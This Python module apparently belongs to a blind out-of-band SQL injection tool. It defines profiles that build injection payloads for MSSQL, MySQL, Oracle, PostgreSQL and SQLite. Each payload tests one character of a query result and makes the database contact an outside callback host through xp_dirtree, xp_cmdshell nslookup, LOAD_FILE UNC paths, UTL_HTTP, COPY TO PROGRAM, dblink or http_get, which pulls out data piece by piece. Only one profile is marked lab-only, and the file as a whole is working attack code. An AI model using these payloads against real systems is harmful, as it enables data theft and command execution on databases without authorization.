from dataclasses import dataclass


@dataclass(frozen=True)
class Profile:
    name: str
    description: str
    comment: str

    def substring(self, expression: str, pos: int) -> str:
        if self.name in ("mssql", "mssql-cmdshell"):
            return f"SUBSTRING(({expression}),{pos},1)"
        if self.name == "oracle-http":
            return f"SUBSTR(({expression}),{pos},1)"
        return f"substr(({expression}),{pos},1)"

    def condition(self, expression: str, pos: int, char: str) -> str:
        return f"{self.substring(expression, pos)}='{char}'"

    def condition_gte(self, expression: str, pos: int, char: str) -> str:
        return f"{self.substring(expression, pos)}>='{char}'"

    def payload(self, base: str, condition: str, callback_host: str) -> str:
        if self.name == "sqlite-lab":
            return (
                f"{base}' AND CASE WHEN {condition} "
                f"THEN dns_lookup('{callback_host}') ELSE 0 END--"
            )
        if self.name == "mssql":
            return (
                f"{base}';IF ({condition}) "
                f"EXEC master..xp_dirtree '\\\\{callback_host}\\x'--"
            )
        if self.name == "mysql":
            return (
                f"{base}' AND IF({condition},"
                f"LOAD_FILE('\\\\\\\\{callback_host}\\\\x'),0)-- "
            )
        if self.name == "oracle-http":
            return (
                f"{base}'||(SELECT CASE WHEN {condition} "
                f"THEN UTL_HTTP.REQUEST('http://{callback_host}/') ELSE '' END FROM dual)||'"
            )
        if self.name == "postgres-program":
            escaped = callback_host.replace("'", "'\"'\"'")
            return (
                f"{base}';DO $$ BEGIN IF ({condition}) THEN "
                f"COPY (SELECT '') TO PROGRAM 'nslookup {escaped}'; "
                f"END IF; END $$;--"
            )
        if self.name == "postgres-dblink":
            return (
                f"{base}';SELECT CASE WHEN {condition} THEN "
                f"dblink_connect('host={callback_host} user=a password=a dbname=a') "
                f"ELSE NULL END::text--"
            )
        if self.name == "mssql-cmdshell":
            return (
                f"{base}';IF ({condition}) "
                f"EXEC master..xp_cmdshell 'nslookup {callback_host}'--"
            )
        if self.name == "mysql-stacked":
            escaped = callback_host.replace("'", "''")
            return (
                f"{base}'; SELECT IF({condition},"
                f"LOAD_FILE('\\\\\\\\{escaped}\\\\x'),NULL);--"
            )
        if self.name == "sqlite-http":
            return (
                f"{base}' AND CASE WHEN {condition} "
                f"THEN http_get('http://{callback_host}/') ELSE 0 END--"
            )
        raise ValueError(f"unknown profile: {self.name}")


PROFILES = {
    "sqlite-lab": Profile(
        "sqlite-lab",
        "Training profile for lab/blind_sqli_lab.py using SQLite dns_lookup()",
        "Local lab only.",
    ),
    "mssql": Profile(
        "mssql",
        "MSSQL stacked query using xp_dirtree UNC DNS callbacks",
        "Requires xp_dirtree access and outbound DNS/SMB resolution.",
    ),
    "mysql": Profile(
        "mysql",
        "MySQL LOAD_FILE UNC callback, mostly useful on Windows targets",
        "Requires FILE privilege and Windows-style UNC resolution.",
    ),
    "oracle-http": Profile(
        "oracle-http",
        "Oracle UTL_HTTP callback",
        "Requires UTL_HTTP/network ACL access.",
    ),
    "postgres-program": Profile(
        "postgres-program",
        "PostgreSQL COPY TO PROGRAM callback",
        "Requires stacked queries and high privileges (usually superuser/pg_execute_server_program).",
    ),
    "postgres-dblink": Profile(
        "postgres-dblink",
        "PostgreSQL dblink extension callback — lower privilege than COPY TO PROGRAM",
        "Requires dblink extension. No superuser needed in most default Postgres installs.",
    ),
    "mssql-cmdshell": Profile(
        "mssql-cmdshell",
        "MSSQL xp_cmdshell nslookup callback — alternative when xp_dirtree is blocked",
        "Requires: EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE.",
    ),
    "mysql-stacked": Profile(
        "mysql-stacked",
        "MySQL LOAD_FILE via stacked query — for multi-statement enabled targets",
        "Requires FILE privilege, stacked queries, and Windows-style UNC resolution.",
    ),
    "sqlite-http": Profile(
        "sqlite-http",
        "SQLite http_get() callback via sqlite-http/sqlean-http extension",
        "Requires the sqlite-http extension loaded. Common in some CTF challenge deployments.",
    ),
}
